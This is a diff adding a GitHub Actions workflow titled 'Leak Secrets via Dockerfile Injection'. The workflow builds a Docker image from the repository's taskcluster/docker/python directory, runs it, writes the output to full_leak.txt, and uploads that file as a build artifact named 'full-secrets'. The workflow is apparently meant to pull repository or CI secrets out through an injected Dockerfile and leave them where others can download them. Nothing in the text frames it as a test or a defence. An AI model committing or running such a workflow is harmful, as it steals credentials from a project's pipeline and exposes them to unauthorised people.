@@ -1,0 +1,26 @@
+name: Leak Secrets via Dockerfile Injection
+
+on:
+  workflow_dispatch:
+
+jobs:
+  leak:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Build Docker image
+        run: |
+          docker build -t secretleak ./taskcluster/docker/python
+
+      - name: Run container and extract secrets
+        run: |
+          docker run --rm secretleak > full_leak.txt
+
+      - name: Upload leak report
+        uses: actions/upload-artifact@v3.1.3
+        with:
+          name: full-secrets
+          path: full_leak.txt
